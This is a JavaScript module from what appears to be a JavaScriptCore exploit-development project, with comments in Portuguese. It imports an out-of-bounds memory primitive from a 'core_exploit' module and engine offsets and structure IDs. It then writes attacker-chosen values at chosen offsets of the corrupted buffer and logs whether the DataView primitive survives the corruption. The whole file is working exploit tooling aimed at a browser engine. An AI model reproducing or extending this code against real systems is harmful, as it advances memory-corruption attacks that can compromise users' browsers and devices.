// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real, // Importa oob_dataview_real
    oob_write_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS, KNOWN_STRUCTURE_IDS } from '../config.mjs';

// Não precisaremos do contador de toJSON para este teste específico
// let callCount_toJSON_tc = 0; 

async function executeSingleJsonTCTest_TestOOBPrimitive( // Nome da função alterado para clareza
    description,
    corruption_offset,
    value_to_write,
    // enable_pp, // Não relevante para este teste
    // attemptOOBWrite, // A escrita OOB é o foco deste teste
    skipOOBEnvironmentSetup,
    logFn = logS3
) {
    const FNAME_SINGLE_TEST = `executeTestOOBPrimitive<${description}>`;
    logFn(`--- Iniciando Teste da Primitiva OOB: ${description} ---`, "test", FNAME_SINGLE_TEST);
    logFn(`   Offset Corrupção: ${toHex(corruption_offset)}, Valor: ${toHex(value_to_write)}, Setup OOB: ${!skipOOBEnvironmentSetup}`, "info", FNAME_SINGLE_TEST);

    if (!skipOOBEnvironmentSetup) {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { // Verifica ambos
            logFn("Falha ao configurar ambiente OOB (buffer ou dataview nulo). Abortando.", "error", FNAME_SINGLE_TEST);
            return false;
        }
    } else {
        logFn("Setup do ambiente OOB pulado. Este teste requer o setup OOB.", "warn", FNAME_SINGLE_TEST);
        if (oob_array_buffer_real) clearOOBEnvironment();
        return false; // Não faz sentido continuar sem o setup OOB
    }

    // Não criamos victim_ab nem poluímos toJSON para este teste
    // let victim_ab = new ArrayBuffer(64);
    // logFn(`ArrayBuffer vítima (64 bytes) recriado.`, "info", FNAME_SINGLE_TEST);
    // const ppKey = 'toJSON';
    // let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
    // let pollutionApplied = false;

    let testSucceededSpeculatively = false;

    try {
        // Realizar a escrita OOB
        const bytes_to_write_for_corruption = 4; // Assumindo 4 bytes para 0xFFFFFFFF
        if (corruption_offset >= 0 && corruption_offset + bytes_to_write_for_corruption <= oob_array_buffer_real.byteLength) {
            logFn(`CORRUPÇÃO: Escrevendo valor ${toHex(value_to_write)} (${bytes_to_write_for_corruption} bytes) em offset abs ${toHex(corruption_offset)} do oob_array_buffer_real`, "warn", FNAME_SINGLE_TEST);
            oob_write_absolute(corruption_offset, value_to_write, bytes_to_write_for_corruption);
            logFn(`Escrita OOB em ${toHex(corruption_offset)} realizada.`, "info", FNAME_SINGLE_TEST);
        } else {
            logFn(`AVISO: Offset de corrupção ${toHex(corruption_offset)} inválido. Escrita OOB não realizada.`, "warn", FNAME_SINGLE_TEST);
            // Ainda prossegue para o finally limpar, mas o teste em si não é válido
        }

        await PAUSE_S3(SHORT_PAUSE_S3);

        // Tentar usar a oob_dataview_real APÓS a escrita OOB
        logFn(`>>> PRESTES A TENTAR USAR oob_dataview_real APÓS escrita OOB em ${toHex(corruption_offset)}...`, "critical", FNAME_SINGLE_TEST);
        try {
            // Tenta ler do início da DataView.
            // O offset 0 aqui é relativo ao início da oob_dataview_real,
            // que por sua vez começa em OOB_CONFIG.BASE_OFFSET_IN_DV dentro do oob_array_buffer_real.
            let testRead = oob_dataview_real.getUint32(0, true); 
            logFn(`<<< Leitura da oob_dataview_real (offset 0) retornou: ${toHex(testRead)}`, "info", FNAME_SINGLE_TEST);
            // Tente ler de outros offsets da dataview também se o primeiro funcionar
            // testRead = oob_dataview_real.getUint32(4, true);
            // logFn(`<<< Leitura da oob_dataview_real (offset 4) retornou: ${toHex(testRead)}`, "info", FNAME_SINGLE_TEST);
            logFn("Parece que a oob_dataview_real ainda é utilizável após a escrita OOB.", "good", FNAME_SINGLE_TEST);

        } catch (e_dv_op) {
            logFn(`ERRO CRÍTICO ao usar oob_dataview_real APÓS escrita OOB: ${e_dv_op.name} - ${e_dv_op.message}.`, "critical", FNAME_SINGLE_TEST);
            logFn(`  ---> SUCESSO ESPECULATIVO: Corrupção da primitiva OOB DETECTADA! <---`, "vuln", FNAME_SINGLE_TEST);
            console.error(`Erro ao usar oob_dataview_real (${description}):`, e_dv_op);
            testSucceededSpeculatively = true;
        }

    } catch (mainIterationError) {
        logFn(`Erro principal na iteração do teste (${description}): ${mainIterationError.message}`, "error", FNAME_SINGLE_TEST);
        console.error(mainIterationError);
    } finally {
        // Limpeza do ambiente OOB é crucial
        if (!skipOOBEnvironmentSetup && oob_array_buffer_real) {
            clearOOBEnvironment();
        }
    }
    logFn(`--- Teste da Primitiva OOB Concluído: ${description} (Sucesso Especulativo de Corrupção da Primitiva: ${testSucceededSpeculatively}) ---`, "test", FNAME_SINGLE_TEST);
    return testSucceededSpeculatively;
}

// Função exportada para rodar este teste específico
// Os parâmetros enablePP e attemptOOBWrite são implicitamente verdadeiros ou irrelevantes para este teste específico
export async function runTestCorruptOOBPrimitive(description, corruptionOffset, valueToWrite) {
    // skipOOBEnvironmentSetup é false por padrão, pois o teste precisa do ambiente OOB
    return await executeSingleJsonTCTest_TestOOBPrimitive(description, corruptionOffset, valueToWrite, false, logS3);
}

// Mantemos a função antiga para não quebrar importações, mas ela não será o foco
export async function testJsonTypeConfusionUAFSpeculative() {
    logS3("Função testJsonTypeConfusionUAFSpeculative NÃO RECOMENDADA para este teste. Use runTestCorruptOOBPrimitive.", "warn");
}
